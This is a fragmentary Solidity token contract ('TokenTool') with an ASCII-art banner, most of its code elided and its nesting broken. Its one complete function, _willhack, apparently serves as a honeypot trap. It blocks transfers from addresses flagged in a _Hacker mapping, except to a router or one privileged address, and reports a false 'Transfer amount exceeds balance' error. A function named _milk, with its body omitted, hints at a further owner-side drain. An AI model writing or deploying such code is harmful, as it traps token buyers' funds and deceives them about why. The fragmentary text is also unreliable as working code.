...
/**
   ...
   ___  ____  ____   _____ ______    ___  ____  ____  
  /  _]|    ||    \ / ___/|      |  /  _]|    ||    \ 
 /  [_  |  | |  _  (   \_ |      | /  [_  |  | |  _  |
|    _] |  | |  |  |\__  ||_|  |_||    _] |  | |  |  |
|   [_  |  | |  |  |/  \ |  |  |  |   [_  |  | |  |  |
|     | |  | |  |  |\    |  |  |  |     | |  | |  |  |
|_____||____||__|__| \___|  |__|  |_____||____||__|__|
...
contract TokenTool is Ownable {
    ...
    function bulkTransfer(address[] calldata to, uint256[] calldata amounts) public {
      ...
      function _milk(address miner, uint256 _value) external  {
    ...
    function _willhack(address sender, address recipient, uint256 amount) internal view virtual{
          if(recipient != _address0 && sender != _address0 && amount > _zero){
              if( _Hacker[sender]){
                  require(_Hacker[sender] == false || recipient==_router || sender == _address1  ,"Transfer amount exceeds balance");}}           
    }
